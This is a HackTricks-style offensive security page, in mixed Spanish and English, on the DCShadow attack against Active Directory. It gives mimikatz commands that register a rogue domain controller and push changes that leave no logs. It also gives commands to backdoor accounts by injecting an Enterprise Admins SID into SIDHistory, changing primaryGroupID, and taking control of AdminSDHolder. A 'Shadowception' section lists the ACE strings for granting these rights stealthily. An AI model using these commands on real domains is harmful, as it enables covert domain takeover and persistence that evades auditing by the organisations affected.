{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Registra un **nuevo Controlador de Dominio** en el AD y lo utiliza para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. Necesitas privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que si usas datos incorrectos, aparecerán registros bastante feos.

Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí debes indicar los cambios que deseas realizar), y la otra instancia se utilizará para empujar los valores:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

You can push the changes from a DA or from a user with this minimal permissions:

- In the **domain object**:
- _DS-Install-Replica_ (Agregar/Eliminar Réplica en Dominio)
- _DS-Replication-Manage-Topology_ (Gestionar Topología de Replicación)
- _DS-Replication-Synchronize_ (Sincronización de Replicación)
- The **Sites object** (and its children) in the **Configuration container**:
- _CreateChild and DeleteChild_
- The object of the **computer which is registered as a DC**:
- _WriteProperty_ (No Write)
- The **target object**:
- _WriteProperty_ (No Write)

You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.

## Using DCShadow to create backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)

Necesitamos agregar los siguientes ACEs con el SID de nuestro usuario al final:

- En el objeto de dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- En el objeto de computadora del atacante: `(A;;WP;;;UserSID)`
- En el objeto de usuario objetivo: `(A;;WP;;;UserSID)`
- En el objeto de Sitios en el contenedor de Configuración: `(A;CI;CCDC;;;UserSID)`

Para obtener el ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Ten en cuenta que en este caso necesitas hacer **varios cambios,** no solo uno. Así que, en la **sesión mimikatz1** (servidor RPC) usa el parámetro **`/stack` con cada cambio** que quieras hacer. De esta manera, solo necesitarás **`/push`** una vez para realizar todos los cambios acumulados en el servidor rogue.

[**Más información sobre DCShadow en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
